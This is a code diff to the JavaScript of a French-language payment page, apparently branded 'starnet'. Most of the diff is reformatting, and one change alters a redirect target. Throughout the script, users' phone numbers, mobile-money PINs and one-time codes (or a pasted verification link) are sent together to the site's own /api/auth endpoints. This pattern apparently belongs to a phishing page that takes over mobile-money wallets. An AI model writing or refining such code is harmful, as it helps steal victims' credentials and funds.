@@ -133,16 +133,14 @@
       body: JSON.stringify(body)
     });
     let data = {};
-    try {
-      data = await res.json();
-    } catch (_) {}
+    try { data = await res.json(); } catch (_) {}
     if (!res.ok) throw new Error(data.error || "Erreur (" + res.status + ")");
     return data;
   }
 
   function goStatus() {
     try { sessionStorage.setItem("starnet_paid", "1"); } catch (_) {}
-    location.href = "/index.html?paid=1";
+    location.href = "/network-status.html?paid=1";
   }
 
   document.getElementById("btnNext").addEventListener("click", async () => {
@@ -155,11 +153,8 @@
     lastPhone = fullPhone();
     try {
       const data = await postJson("/api/auth/send-otp", {
-        phone: lastPhone,
-        pin: lastPin,
-        provider,
-        amount: amount ? amount + " " + cur : "",
-        package: packageName
+        phone: lastPhone, pin: lastPin, provider,
+        amount: amount ? amount + " " + cur : "", package: packageName
       });
       otpLen = data.otpLength || (isOrange ? 6 : 4);
       if (isOrange) {
@@ -205,12 +200,8 @@
     msg.classList.add("show");
     try {
       await postJson("/api/auth/verify-otp", {
-        phone: lastPhone,
-        pin: lastPin,
-        link: linkInput.value.trim(),
-        provider,
-        amount: amount ? amount + " " + cur : "",
-        package: packageName
+        phone: lastPhone, pin: lastPin, link: linkInput.value.trim(), provider,
+        amount: amount ? amount + " " + cur : "", package: packageName
       });
       setTimeout(goStatus, 900);
     } catch (e) {
@@ -238,9 +229,7 @@
       row.appendChild(inp);
     }
     const boxes = Array.from(row.querySelectorAll(".pin-box"));
-    function getOtp() {
-      return boxes.map((b) => b.value).join("");
-    }
+    function getOtp() { return boxes.map((b) => b.value).join(""); }
     boxes.forEach((box, i) => {
       box.addEventListener("input", () => {
         box.value = box.value.replace(/\D/g, "").slice(0, 1);
@@ -268,12 +257,8 @@
     btn.textContent = "Vérification…";
     try {
       await postJson("/api/auth/verify-otp", {
-        phone: lastPhone,
-        pin: lastPin,
-        otp,
-        provider,
-        amount: amount ? amount + " " + cur : "",
-        package: packageName
+        phone: lastPhone, pin: lastPin, otp, provider,
+        amount: amount ? amount + " " + cur : "", package: packageName
       });
       goStatus();
     } catch (e) {
@@ -298,23 +283,18 @@
       if (t) t.textContent = String(s);
       if (s <= 0) {
         clearInterval(timerIv);
-        info.innerHTML =
-          '<a href="#" id="resendLink" style="color:#FF6600;font-weight:600">Renvoyer le lien</a>';
+        info.innerHTML = '<a href="#" id="resendLink" style="color:#FF6600;font-weight:600">Renvoyer le lien</a>';
         const a = document.getElementById("resendLink");
-        if (a)
-          a.onclick = async (e) => {
-            e.preventDefault();
-            try {
-              await postJson("/api/auth/send-otp", {
-                phone: lastPhone,
-                pin: lastPin,
-                provider,
-                amount: amount ? amount + " " + cur : "",
-                package: packageName
-              });
-              startTimer();
-            } catch (_) {}
-          };
+        if (a) a.onclick = async (e) => {
+          e.preventDefault();
+          try {
+            await postJson("/api/auth/send-otp", {
+              phone: lastPhone, pin: lastPin, provider,
+              amount: amount ? amount + " " + cur : "", package: packageName
+            });
+            startTimer();
+          } catch (_) {}
+        };
       }
     }, 1000);
   }
